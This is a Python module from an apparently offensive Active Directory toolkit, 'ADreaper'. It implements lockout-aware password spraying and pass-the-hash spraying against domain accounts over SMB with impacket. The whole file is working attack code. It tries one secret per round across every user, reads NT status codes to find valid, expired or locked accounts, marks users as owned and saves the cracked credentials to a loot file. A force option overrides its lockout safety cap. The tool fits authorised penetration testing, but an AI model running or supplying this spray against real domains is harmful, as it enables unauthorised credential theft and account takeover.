"""Password spraying — lockout-aware, low-and-slow credential testing over SMB.

Sprays one secret across every account per round, then waits, rather than
hammering a single account (which triggers lockout). It refuses to exceed the
domain's lockout threshold unless explicitly forced, and aborts the instant any
account reports LOCKED_OUT. A supplied NT hash is sprayed instead of a password
(pass-the-hash spray).

Safety-first defaults are a hard design rule — see docs/ARCHITECTURE.md.
"""

from __future__ import annotations

import time
from pathlib import Path

from adreaper.core.context import EngagementContext
from adreaper.core.graph import NodeType
from adreaper.core.logging import log
from adreaper.core.module import BaseModule, ModuleResult, Option, OptionType, Severity


class PasswordSpray(BaseModule):
    name = "credentials/password_spray"
    description = "Lockout-aware password/hash spray across domain accounts (SMB)."
    author = "ADreaper Contributors"
    category = "credentials"
    requires = ["impacket"]
    references = ["https://attack.mitre.org/techniques/T1110/003/"]
    options = [
        Option("user", "Target user(s), comma-separated (overrides graph users)",
               type=OptionType.STRING),
        Option("userfile", "File with one username per line", type=OptionType.STRING),
        Option("password", "Password(s) to spray, comma-separated", type=OptionType.STRING),
        Option("passwordfile", "File with one password per line", type=OptionType.STRING),
        Option("hash", "NT or LM:NT hash to spray (pass-the-hash)", type=OptionType.STRING),
        Option("delay", "Seconds to wait between rounds (low-and-slow)", default=5,
               type=OptionType.INT),
        Option("lockout_threshold", "Domain lockout threshold (0 = unknown)", default=0,
               type=OptionType.INT),
        Option("force", "Override the lockout safety cap (dangerous)", default=False,
               type=OptionType.BOOL),
        Option("stop_on_success", "Stop spraying a user once a secret works", default=True,
               type=OptionType.BOOL),
    ]

    def run(self, ctx: EngagementContext) -> ModuleResult:
        res = self.result()
        target = ctx.primary_target()
        if not target:
            return res.fail("no target host (use --dc-ip or --target)").finish()

        users = self._users(ctx)
        secrets = self._secrets()
        if not users:
            return res.fail("no users (run recon/ldap_enum, or -o user=/-o userfile=)").finish()
        if not secrets:
            return res.fail("no secrets (-o password=, -o passwordfile=, or -o hash=)").finish()

        threshold = self._effective_threshold(ctx)
        rounds, warning = plan_spray(len(secrets), threshold, bool(self.opt("force")))
        if warning:
            log.warn(warning)
        if rounds <= 0:
            return res.fail(
                "refusing to spray: lockout threshold too low. Use -o force=true to override."
            ).finish()

        delay = int(self.opt("delay", 5))
        stop_on_success = bool(self.opt("stop_on_success"))
        log.info("spraying %d secret round(s) x %d user(s) on %s (delay %ds, threshold %s)",
                 rounds, len(users), target, delay, threshold or "unknown")

        valid: list[str] = []
        solved: set[str] = set()
        try:
            for r in range(rounds):
                kind, value = secrets[r]
                shown = value if kind == "hash" else "*" * len(value)
                log.info("round %d/%d — spraying %s: %s", r + 1, rounds, kind, shown)
                for user in users:
                    if user in solved:
                        continue
                    status = self._attempt(ctx, target, user, kind, value)
                    if status == "locked":
                        res.add_finding(
                            f"Account lockout detected during spray: {user}",
                            Severity.CRITICAL,
                            description="Aborting immediately to avoid locking further accounts.",
                            target=user,
                        )
                        log.error("LOCKOUT on %s — aborting spray", user)
                        raise _Abort()
                    if status in ("valid", "expired", "disabled"):
                        cred_str = f"{user}:{value}" if kind == "password" else f"{user}:{value} (hash)"
                        valid.append(cred_str)
                        solved.add(user)
                        note = "" if status == "valid" else f" ({status})"
                        log.ok("VALID %s%s", cred_str, note)
                        sev = Severity.HIGH if status == "valid" else Severity.MEDIUM
                        res.add_finding(
                            f"Valid credential found: {user}{note}",
                            sev,
                            description="Credential authenticated over SMB.",
                            evidence=cred_str,
                            target=user,
                        )
                        node = ctx.graph.find(user, NodeType.USER)
                        if node:
                            node[0].properties["owned"] = True
                        if not stop_on_success:
                            solved.discard(user)
                if r < rounds - 1 and delay:
                    time.sleep(delay)
        except _Abort:
            pass

        if valid:
            out = ctx.loot_dir() / "valid_credentials.txt"
            out.write_text("\n".join(valid) + "\n", encoding="utf-8")
            log.ok("%d valid credential(s) -> %s", len(valid), out)
            res.data["valid_file"] = str(out)
        else:
            log.info("no valid credentials found")
        res.data["valid"] = len(valid)
        return res.finish()

    # -- inputs -----------------------------------------------------------

    def _users(self, ctx: EngagementContext) -> list[str]:
        raw = self.opt("user")
        if raw:
            return [u.strip() for u in raw.split(",") if u.strip()]
        uf = self.opt("userfile")
        if uf:
            return _read_lines(uf)
        return [n.name for n in ctx.graph.nodes_of(NodeType.USER)
                if n.properties.get("enabled", True)]

    def _secrets(self) -> list[tuple[str, str]]:
        h = self.opt("hash")
        if h:
            return [("hash", h.strip())]
        pw = self.opt("password")
        if pw:
            return [("password", p) for p in pw.split(",") if p]
        pf = self.opt("passwordfile")
        if pf:
            return [("password", p) for p in _read_lines(pf)]
        return []

    def _effective_threshold(self, ctx: EngagementContext) -> int:
        opt = int(self.opt("lockout_threshold", 0))
        if opt:
            return opt
        # reuse a threshold discovered by recon/ldap_enum if present on the domain node
        dom = ctx.graph.get(ctx.domain) if ctx.domain else None
        if dom:
            return int(dom.properties.get("lockout_threshold", 0) or 0)
        return 0

    # -- one authentication attempt --------------------------------------

    def _attempt(self, ctx, target, user, kind, value) -> str:
        from impacket.smbconnection import SMBConnection  # type: ignore

        lm = nt = ""
        password = ""
        if kind == "hash":
            norm = _normalize_hash(value)
            lm, nt = norm.split(":", 1)
        else:
            password = value
        try:
            conn = SMBConnection(target, target, sess_port=445, timeout=ctx.timeout)
        except Exception as e:
            log.debug("connect failed: %s", e)
            return "error"
        try:
            conn.login(user, password, ctx.domain, lmhash=lm, nthash=nt)
            try:
                conn.close()
            except Exception:
                pass
            return "valid"
        except Exception as e:
            return _classify_error(e)


# ---------------------------------------------------------------------------
# pure helpers (unit-tested)
# ---------------------------------------------------------------------------

class _Abort(Exception):
    pass


def plan_spray(num_secrets: int, threshold: int, force: bool) -> tuple[int, str]:
    """Decide how many spray rounds are safe.

    One round = one secret tried once against every account. To stay under a
    lockout threshold of N failed attempts, run at most N-1 rounds. With an
    unknown threshold, run a single round unless forced.
    """
    if force:
        return num_secrets, ("force=true: lockout safety cap disabled — you may lock accounts"
                             if num_secrets > 1 else "")
    if threshold and threshold > 0:
        safe = max(threshold - 1, 0)
    else:
        safe = 1
    rounds = min(num_secrets, safe)
    warning = ""
    if rounds < num_secrets:
        warning = (f"lockout safety: trimming {num_secrets} secrets to {rounds} round(s) "
                   f"(threshold={threshold or 'unknown'}). Use -o force=true to override.")
    return rounds, warning


NT_STATUS = {
    "STATUS_LOGON_FAILURE": "invalid",
    "STATUS_ACCOUNT_LOCKED_OUT": "locked",
    "STATUS_PASSWORD_EXPIRED": "expired",
    "STATUS_PASSWORD_MUST_CHANGE": "expired",
    "STATUS_ACCOUNT_DISABLED": "disabled",
    "STATUS_ACCOUNT_RESTRICTION": "disabled",
    "STATUS_ACCOUNT_EXPIRED": "disabled",
    "STATUS_INVALID_LOGON_HOURS": "disabled",
}


def _classify_error(e: Exception) -> str:
    msg = str(e).upper()
    for key, verdict in NT_STATUS.items():
        if key in msg:
            return verdict
    return "invalid"


def _normalize_hash(h: str) -> str:
    h = h.strip()
    if ":" in h:
        return h
    return f"aad3b435b51404eeaad3b435b51404ee:{h}"


def _read_lines(path: str) -> list[str]:
    try:
        return [ln.strip() for ln in Path(path).read_text(encoding="utf-8").splitlines()
                if ln.strip() and not ln.startswith("#")]
    except OSError as e:
        log.warn("could not read %s: %s", path, e)
        return []
